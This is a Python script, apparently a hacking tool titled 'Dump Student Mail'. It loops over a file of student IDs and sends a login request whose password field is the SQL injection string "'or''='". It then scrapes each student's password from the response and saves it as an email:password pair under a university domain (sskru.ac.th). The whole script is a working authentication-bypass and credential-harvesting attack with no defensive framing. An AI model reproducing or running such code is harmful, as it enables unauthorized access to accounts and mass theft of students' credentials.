import requests, time, os, sys
from bs4 import BeautifulSoup
###############################
W = "\033[0m"     # white
R = '\033[31;1m'  # red
G = '\033[32;1m'  # green
B = '\033[34m'    # blue
O = '\033[93m'    # orange
###############################
banner = '''

    ██████╗ ██╗   ██╗███╗   ███╗██████╗     ███████╗████████╗██╗   ██╗██████╗ ███████╗███╗   ██╗████████╗    ███╗   ███╗ █████╗ ██╗██╗     
    ██╔══██╗██║   ██║████╗ ████║██╔══██╗    ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝████╗  ██║╚══██╔══╝    ████╗ ████║██╔══██╗██║██║     
    ██║  ██║██║   ██║██╔████╔██║██████╔╝    ███████╗   ██║   ██║   ██║██║  ██║█████╗  ██╔██╗ ██║   ██║       ██╔████╔██║███████║██║██║     
    ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝     ╚════██║   ██║   ██║   ██║██║  ██║██╔══╝  ██║╚██╗██║   ██║       ██║╚██╔╝██║██╔══██║██║██║     
    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║         ███████║   ██║   ╚██████╔╝██████╔╝███████╗██║ ╚████║   ██║       ██║ ╚═╝ ██║██║  ██║██║███████╗
    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝         ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                                                                                        
'''
def main():
    os.system("cls")
    print(O + banner)
    print(f"{G}-----------------------------------")
    path_file = input("[?] Enter Path File Student id >> ")
    url = "" # url target
    try:
        with requests.session() as session:
            with open(path_file,"r") as f:
                std_id = f.readlines()  
            std_id_list = [line[:-1] for line in std_id]
            print(f"\n{G} --------------- Result ----------------")
            n = 0
            for student_id in std_id_list:            
                # set payloads     
                payload = {
                    'idno' : student_id,
                    'idpass' : "'or''='",
                    'page': 1,
                    'Submit' : '++%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A++'
                }              
                response = session.post(url, data=payload)
                soup = BeautifulSoup(response.text,'html.parser')
                find_tag = soup.find_all("img")[1]
                str_data = str(find_tag).split(" ")
                std_pass = str_data[3][35:-5:]      
                n += 1
                with open("data.txt","a") as f:
                    f.write(f'stu{student_id}@sskru.ac.th:{std_pass}\n')
                    print(f"{G}[✓] {student_id} Successful. Count({n})")
                    time.sleep(2)
            print(f"{G} ---------------------------------------\n")
            desc = f"[✓] Dump Student Mail Successful."
            for info in list(desc):
                print(info, end="",flush=True)
                time.sleep(0.01)
            time.sleep(3)
    except:
        print(f"{R}[!] Failed.\n")
        print(response)
        time.sleep(3)
if __name__ == '__main__':
    while True:   
        os.system("cls")
        print(f"{O}{banner}")
        menu = input(f"{G}[?] Enter (r)Run or (e)exit >> ")
        if menu in ['r','R']:
            main()
        elif menu in ['e','E']:
            sys.exit()